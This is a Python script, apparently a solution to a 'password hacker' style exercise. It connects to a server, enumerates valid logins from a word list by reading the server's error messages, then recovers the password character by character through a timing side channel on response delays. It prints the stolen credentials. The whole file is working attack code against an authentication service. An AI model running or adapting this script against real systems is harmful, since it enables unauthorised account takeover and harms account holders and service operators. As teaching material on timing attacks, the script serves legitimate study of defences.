import json
import os
import socket
import sys
from datetime import datetime
from string import ascii_letters, digits

dir_name = os.path.dirname(os.path.abspath(__file__))
login_file = os.path.join(dir_name, 'logins.txt')

ascii_digletters = ascii_letters + digits
BUFF_SIZE = 1024
address, port = sys.argv[1:]
server = (address, int(port))

pswd_symbs_lst = []

if __name__ == '__main__':
    with socket.socket() as new_sock, open(login_file, 'r') as lgs:

        logins = [i.strip() for i in lgs]

        new_sock.connect(server)

        for login in logins:

            byte_login = json.dumps({'login': login, 'password': ''}).encode()
            new_sock.send(byte_login)
            response = json.loads(new_sock.recv(BUFF_SIZE).decode())

            if response.get('result') == 'Wrong password!':
                correct_login = login
                break

        flag = True

        while flag:

            for symb in ascii_digletters:
                password = ''.join(pswd_symbs_lst) + symb
                byte_data = json.dumps({'login': correct_login, 'password': password}).encode()
                new_sock.send(byte_data)

                start = datetime.now()
                response = json.loads(new_sock.recv(BUFF_SIZE).decode())
                end = datetime.now()
                total_time = end - start

                if total_time.microseconds >= 9000:
                    pswd_symbs_lst.append(symb)
                    break

                elif response.get('result') == 'Connection success!':
                    pswd_symbs_lst.append(symb)
                    result = {'login': correct_login, 'password': ''.join(pswd_symbs_lst)}
                    print(json.dumps(result))
                    flag = False
                    break
